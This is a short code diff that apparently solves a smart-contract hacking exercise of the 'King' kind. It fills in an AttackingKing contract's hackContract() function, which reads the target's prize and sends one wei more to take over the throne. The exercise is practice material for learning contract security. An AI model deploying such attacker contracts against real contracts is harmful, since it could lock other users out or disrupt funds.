@@ -10,7 +10,14 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+
     function hackContract() external {
-        // Code me!
+        //get amount of latest prize
+        uint256 prize = King(payable(contractAddress)).prize();
+
+        //send just a little bit more than current prize
+        (bool success,) = payable(contractAddress).call{value: prize + 1, gas: 100000}("");
+        
+        require(success, "CALL_FAILED");
     }
 }
